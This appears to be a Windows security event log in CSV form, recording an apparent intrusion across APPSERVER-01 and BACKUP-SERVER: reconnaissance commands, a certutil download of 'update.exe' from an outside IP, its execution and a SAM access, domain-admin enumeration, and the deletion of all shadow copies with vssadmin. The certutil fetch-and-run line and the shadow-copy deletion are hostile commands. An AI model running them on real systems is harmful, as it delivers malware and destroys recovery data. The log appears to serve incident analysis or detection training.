timestamp,event_id,computer,username,event_type,description
2024-11-21T00:10:07,4624,APPSERVER-01,svc-app,Network Logon,Network logon successful. Type 3. Account: svc-app. Source: 10.0.2.10. Authentication: NTLM. Elevated Token: Yes
2024-11-21T00:10:09,4672,APPSERVER-01,svc-app,Special Privileges Assigned,Privileges assigned to new logon. Account: svc-app. Privileges: SeDebugPrivilege SeImpersonatePrivilege SeAssignPrimaryTokenPrivilege
2024-11-21T00:10:15,4688,APPSERVER-01,svc-app,Process Created,New process. Image: C:\Windows\System32\wbem\wmiprvse.exe. Parent: C:\Windows\System32\svchost.exe. PID: 2104
2024-11-21T00:10:22,4688,APPSERVER-01,svc-app,Process Created,New process. Image: C:\Windows\System32\cmd.exe. Parent: wmiprvse.exe. CommandLine: cmd.exe /c whoami. PID: 3812
2024-11-21T00:10:30,4688,APPSERVER-01,svc-app,Process Created,New process. Image: C:\Windows\System32\net.exe. Parent: cmd.exe. CommandLine: net user administrator. PID: 4023
2024-11-21T00:10:38,4688,APPSERVER-01,svc-app,Process Created,New process. Image: C:\Windows\System32\ipconfig.exe. Parent: cmd.exe. CommandLine: ipconfig /all. PID: 4156
2024-11-21T00:11:05,4688,APPSERVER-01,svc-app,Process Created,New process. Image: C:\Windows\System32\certutil.exe. Parent: cmd.exe. CommandLine: certutil.exe -urlcache -split -f https://91.108.4.190/update.exe C:\Windows\Temp\update.exe. PID: 4387
2024-11-21T00:11:47,4688,APPSERVER-01,svc-app,Process Created,New process. Image: C:\Windows\Temp\update.exe. Parent: cmd.exe. CommandLine: update.exe -install. PID: 4612
2024-11-21T00:12:03,4673,APPSERVER-01,svc-app,Privileged Service Call,Privileged service called. Service: Security Account Manager. Process: C:\Windows\Temp\update.exe. PID: 4612
2024-11-21T00:12:15,4688,APPSERVER-01,svc-app,Process Created,New process. Image: C:\Windows\System32\net.exe. Parent: update.exe. CommandLine: net group domain admins /domain. PID: 4891
2024-11-21T00:25:01,4624,BACKUP-SERVER,Administrator,Network Logon,Network logon successful. Type 3. Account: Administrator. Source: 10.0.2.20. Authentication: NTLM. Elevated Token: Yes
2024-11-21T00:25:03,4672,BACKUP-SERVER,Administrator,Special Privileges Assigned,Privileges assigned. Account: Administrator. Privileges: SeDebugPrivilege SeBackupPrivilege SeRestorePrivilege SeTakeOwnershipPrivilege SeTcbPrivilege
2024-11-21T00:25:15,4688,BACKUP-SERVER,Administrator,Process Created,New process. Image: C:\Windows\System32\cmd.exe. Parent: wmiprvse.exe. CommandLine: cmd.exe /c ipconfig /all. PID: 1932
2024-11-21T00:25:30,4688,BACKUP-SERVER,Administrator,Process Created,New process. Image: C:\Windows\System32\net.exe. Parent: cmd.exe. CommandLine: net share. PID: 2014
2024-11-21T00:26:05,4688,BACKUP-SERVER,Administrator,Process Created,New process. Image: C:\Windows\System32\wbadmin.exe. Parent: cmd.exe. CommandLine: wbadmin get versions. PID: 2207
2024-11-21T00:30:22,4688,BACKUP-SERVER,Administrator,Process Created,New process. Image: C:\Windows\System32\vssadmin.exe. Parent: cmd.exe. CommandLine: vssadmin.exe Delete Shadows /All /Quiet. PID: 2644
